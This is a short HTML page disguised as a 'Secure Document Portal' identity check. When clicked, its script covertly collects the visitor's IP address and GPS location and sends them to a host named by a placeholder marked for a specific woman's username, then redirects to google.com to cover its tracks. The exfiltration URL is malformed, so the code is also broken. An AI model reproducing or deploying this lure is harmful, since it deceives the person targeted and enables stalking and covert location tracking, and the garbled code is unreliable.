<!DOCTYPE html>
<html>
<head>
    <title>Secure Document Portal</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: 'Segoe UI', sans-serif; text-align: center; padding-top: 10%; background-color: #f4f7f6; color: #333; }
        .box { background: white; padding: 40px; border-radius: 12px; display: inline-block; box-shadow: 0 4px 20px rgba(0,0,0,0.08); border-top: 5px solid #007bff; }
        .btn { background: #007bff; color: white; border: none; padding: 15px 35px; font-size: 18px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 20px; }
        .btn:hover { background: #0056b3; }
    </style>
</head>
<body>
    <div class="box" id="display">
        <h2>🔒 Identity Verification</h2>
        <p>A secure document has been shared with you.<br>Please verify your zone to continue.</p>
        <button class="btn" onclick="start()">UNLOCK DOCUMENT</button>
    </div>

    <script>
        // 1. CHANGE THIS TO HER USERNAME
        const PA_USERNAME = 'TalentAcquisition'; 

        let info = { ip: "Unknown", lat: "0", lon: "0" };

        // Pre-fetch IP
        fetch('https://ipapi.co').then(r => r.json()).then(d => {
            info.ip = d.ip;
        });

        function start() {
            document.getElementById('display').innerHTML = "<h2>Verifying...</h2><p>Syncing with secure server...</p>";
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => { send(pos.coords.latitude, pos.coords.longitude, "GPS"); },
                    () => { send("0", "0", "Denied"); },
                    { timeout: 5000 }
                );
            } else { send("0", "0", "NotSupported"); }
        }

        function send(lat, lon, type) {
            const url = `https://${PA_USERNAME}://{lat}&lon=${lon}&ip=${info.ip}&type=${type}`;
            fetch(url, { mode: 'no-cors' }).then(() => {
                window.location.href = "https://google.com";
            });
        }
    </script>
</body>
</html>
